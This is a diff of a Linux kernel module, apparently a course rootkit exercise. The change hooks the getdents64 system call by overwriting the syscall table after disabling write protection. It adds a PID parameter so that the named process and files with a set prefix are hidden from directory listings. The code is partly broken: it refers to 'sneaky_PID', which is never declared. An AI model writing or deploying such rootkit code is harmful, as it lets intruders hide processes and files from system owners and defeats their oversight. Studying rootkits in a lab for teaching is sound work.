@@ -28,7 +28,9 @@ struct linux_dirent64 {
                char           d_name[]; /* Filename (null-terminated) */
            };
 
-
+// Command line argument for modules
+static int sneaky_pid;
+module_param(sneaky_pid, int, 0);
 
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
@@ -54,9 +56,9 @@ int disable_page_rw(void *ptr){
 // 1. Function pointer will be used to save address of the original 'openat' syscall.
 // 2. The asmlinkage keyword is a GCC #define that indicates this function
 //    should expect it find its arguments on the stack (not in registers).
-asmlinkage int (*original_openat)(int dirfd, const char *pathname, int flags);
-asmlinkage int (*original_getdents64)(int fd, void *dirp, size_t count);
-asmlinkage int (*original_read)(int fd, void *buf, size_t count);
+asmlinkage int (*original_openat)(struct pt_regs *regs);
+asmlinkage int (*original_getdents64)(struct pt_regs *regs);
+asmlinkage int (*original_read)(struct pt_regs *regs);
 
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
@@ -67,32 +69,70 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 
 }
 
-asmlinkage int sneaky_sys_getdents64(int fd, void *dirp, size_t count)
-{
-  long nread;
+// asmlinkage int sneaky_sys_getdents64(int fd, void *dirp, size_t count)
+// {
+//   long nread;
+//   // Implement the sneaky part here
+//   nread = original_getdents64(fd, dirp, count);
+//   if (nread == -1)
+//     //handle_error("getdents");
+//     printk(KERN_INFO "Error in calling original getdents64\n");
+//   if (nread == 0)
+//     return 0;
+//   else{
+//     struct linux_dirent64 *d;
+//     long bpos = 0;
+//     for(; bpos < nread;){
+//       d = (struct linux_dirent64 *) ((char*)dirp + bpos);
+//       if(strcmp(d->d_name, PREFIX) == 0 || strcmp(d->d_name, "sneaky_pid") ==0){
+//         memmove((char*)dirp + bpos, (char*)dirp + bpos + d->d_reclen, nread - (bpos + d->d_reclen));
+//         nread -= d->d_reclen;   
+//       }
+//       else{
+//         bpos += d->d_reclen;
+//       }
+//     }
+//   }
+  
+//   return nread;
+// }
+
+asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
+// asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 * dirp, unsigned int count){
   // Implement the sneaky part here
-  nread = original_getdents64(fd, dirp, count);
-  if (nread == -1)
-    //handle_error("getdents");
-    return 0;
-  if (nread == 0)
-    return 0;
   struct linux_dirent64 *d;
-  long bpos = 0;
-  for(; bpos < nread;){
-    d = (struct linux_dirent64 *) ((char*)dirp + bpos);
-    if(strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, "sneaky_pid") ==0){
-      memmove((char*)dirp + bpos, (char*)dirp + bpos + d->d_reclen, nread - (bpos + d->d_reclen));
-      nread -= d->d_reclen;   
-    }
-    else{
-      bpos += d->d_reclen;
+  int bpos, nread;
+  
+  unsigned long dirp = regs->si;
+  nread = original_getdents64(regs);
+
+  if(nread == -1){
+    printk(KERN_INFO "Error in calling original gendents64\n");
+  }
+  else if (nread == 0){
+    return 0;
+  }
+  else{
+    for(bpos = 0; bpos < nread;){
+      d = (struct linux_dirent64 *)(dirp + bpos);
+
+      char cmd_buffer[10];
+      snprintf(cmd_buffer, 10, "%d", sneaky_PID);
+      if ((strcmp(d->d_name, PREFIX) == 0) || (strcmp(d->d_name, cmd_buffer) == 0)) {
+      //if(memcmp(PREFIX, d->d_name, strlen(PREFIX)) == 0 ){
+        memmove((char*) dirp + bpos, (char*) dirp + bpos + d->d_reclen, nread - (bpos + d->d_reclen));
+        nread -= d->d_reclen; 
+      }
+      else{
+        bpos += d->d_reclen;
+      }
     }
   }
+
   return nread;
 }
 
-asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
+asmlinkage int sneaky_sys_read(struct pt_regs *regs)
 {
   // Implement the sneaky part here
   //return (*original_read)(regs);
@@ -122,17 +162,17 @@ static int initialize_sneaky_module(void)
   // This is the magic! Save away the original 'openat' system call
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
-  original_openat = (void *)sys_call_table[__NR_openat];
+  //original_openat = (void *)sys_call_table[__NR_openat];
   original_getdents64 = (void *)sys_call_table[__NR_getdents64];
-  original_read = (void *)sys_call_table[__NR_read];
+  //original_read = (void *)sys_call_table[__NR_read];
   
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
   
   // You need to replace other system calls you need to hack here
-  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
+  //sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
-  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
+  //sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
 
 
   
@@ -152,9 +192,9 @@ static void exit_sneaky_module(void)
 
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
-  sys_call_table[__NR_openat] = (unsigned long)original_openat;
+  //sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
-  sys_call_table[__NR_read] = (unsigned long)original_read;
+  //sys_call_table[__NR_read] = (unsigned long)original_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
